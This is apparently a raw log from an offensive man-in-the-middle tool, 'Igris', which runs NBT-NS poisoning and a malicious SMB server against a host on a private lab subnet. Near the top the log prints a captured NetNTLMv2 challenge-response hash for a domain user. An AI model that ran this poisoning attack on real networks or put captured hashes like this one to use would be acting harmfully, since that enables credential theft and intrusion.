2021-11-30 17:39:52.330 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:228 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
2021-12-04 17:26:24.039 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (RSGBENGICORP\apuia,PC-ALEX)
2021-12-04 17:26:24.039 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-ALEX\apuia authenticated successfully
2021-12-04 17:26:24.042 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - apuia::RSGBENGICORP:aaaaaaaaaaaaaaaa:f56dc33781e8c206a37c08a4060605ea:01010000000000000060990f34e9d701ffc34de7774f9e3b0000000001001000440069004a0057004300560051006a0003001000440069004a0057004300560051006a00020010007600590070004c0064004c0067005600040010007600590070004c0064004c0067005600070008000060990f34e9d70106000400020000000800300030000000000000000100000000200000b00025b57ee18ea21b2dfaa257329d0d4bf57affe71c4ad8cbfc05d7fa0ddf480a001000000000000000000000000000000000000900260063006900660073002f0063006f007200720065006500650065006d0061006d006f006f006f000000000000000000
2021-12-04 17:26:24.070 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
2021-12-04 17:26:24.123 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - Packet crafted: 
2021-12-04 17:26:24.124 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:520 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:26:24.886 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - Packet crafted: 
2021-12-04 17:26:24.887 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:520 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:26:25.651 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - Packet crafted: 
2021-12-04 17:26:25.652 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:520 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:26:34.757 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
2021-12-04 17:26:34.760 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.129,49912)
2021-12-04 17:26:34.761 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
2021-12-04 17:26:37.644 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:29:30.982 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 17:29:30.984 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 17:29:30.994 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:29:31.012 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:549 - Starting nbt-ns poisoning...
2021-12-04 17:29:31.013 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:29:31.017 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:29:31.018 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:29:31.018 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:31:08.459 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:33:30.772 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 17:33:30.773 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 17:33:30.778 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:33:30.789 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:549 - Starting nbt-ns poisoning...
2021-12-04 17:33:30.790 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:33:30.797 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:33:30.799 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:33:30.801 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:34:13.437 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:37:21.450 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 17:37:21.451 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 17:37:21.457 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:37:21.462 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:550 - Starting nbt-ns poisoning...
2021-12-04 17:37:21.462 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:37:21.465 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:37:21.466 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:37:21.466 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:37:40.641 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:38:10.688 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 17:38:10.689 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 17:38:10.694 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:38:10.699 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:550 - Starting nbt-ns poisoning...
2021-12-04 17:38:10.700 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:38:10.704 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:38:10.712 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:38:10.713 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:38:25.658 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:39:05.670 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 17:39:05.671 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 17:39:05.674 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:39:05.679 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 17:39:05.680 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:39:05.684 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:39:05.685 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:39:05.685 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:39:42.976 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:41:08.573 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 17:41:08.574 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 17:41:08.578 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:41:08.583 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 17:41:08.584 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:41:08.587 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:41:08.588 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:41:08.588 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:41:30.710 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:41:30.711 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:41:30.711 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:41:30.750 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:41:30.751 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:41:30.751 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:41:57.471 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:41:57.472 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:41:57.472 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:41:57.512 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:41:57.512 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:41:57.513 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:42:00.232 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:44:39.148 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 17:44:39.148 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 17:44:39.151 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:44:39.156 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 17:44:39.156 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:44:39.160 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:44:39.161 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:44:39.164 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:45:07.800 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:07.801 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:07.802 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:45:07.852 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:07.853 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:07.858 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:07.858 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:07.862 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:07.862 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:07.862 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:45:08.128 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:08.129 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:08.541 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:08.542 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:08.550 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:08.551 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:08.556 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:08.556 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:08.878 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:08.879 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:09.304 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:09.305 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:09.305 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:45:09.341 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:09.341 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:09.347 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:09.348 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:09.352 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:09.352 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:09.353 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:45:09.649 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:09.650 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:10.070 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:10.071 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:10.076 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:10.078 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:10.084 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:10.085 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:10.436 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:10.437 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:10.820 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:10.821 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:11.178 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:11.179 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:11.413 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:11.414 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:11.582 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:11.582 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:11.818 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:11.818 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:11.822 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:11.822 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:11.942 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:11.943 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:12.118 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:12.119 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:12.166 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:12.167 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:12.260 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:12.261 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:12.265 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:12.266 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:12.271 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:12.272 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:12.334 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:12.335 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:12.340 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:12.340 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:12.348 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:12.348 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:12.569 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:12.570 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:12.574 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:12.575 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:12.878 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:12.879 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:12.926 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:12.927 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.019 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
